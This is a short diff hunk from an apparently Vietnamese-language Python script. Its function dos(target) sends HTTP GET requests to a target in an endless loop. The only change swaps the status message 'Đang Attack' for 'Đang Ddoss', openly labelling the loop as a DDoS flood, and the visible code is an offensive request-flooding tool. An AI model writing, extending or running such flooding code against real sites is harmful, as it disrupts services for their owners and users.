@@ -6,7 +6,7 @@ def dos(target):
     while True:
         try:
             res = requests.get(target)
-            print("< / > Đang Attack < / >")
+            print("< / > Đang Ddoss < / >")
         except requests.exceptions.ConnectionError:
             print("[error] " + "Kế Nối Bị Lỗi")
  
